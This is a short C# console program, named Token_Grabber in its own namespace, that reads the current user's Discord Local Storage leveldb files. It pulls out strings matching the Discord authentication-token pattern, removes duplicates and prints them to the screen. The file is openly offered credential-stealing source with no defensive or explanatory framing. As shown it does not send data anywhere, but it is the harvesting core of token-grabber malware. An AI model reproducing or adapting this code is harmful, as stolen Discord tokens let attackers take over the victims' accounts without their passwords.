using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;

namespace Token_Grabber
{
    class Program
    {
        static string rgx = @"[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]";
        static string TokenList = null;
        public static string Grab()
        {
            DirectoryInfo DB = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
            List<string> Token = new List<string>();
            foreach (var file in DB.GetFiles("*.ldb"))
                foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), rgx)) Token.Add(match.Value);
            foreach (string token in Token.Distinct().ToList()) TokenList += token + Environment.NewLine;
            return TokenList;
        }
        static void Main(string[] args)
        {
            Console.WriteLine(Grab());
            Console.ReadLine();
        }
    }
}
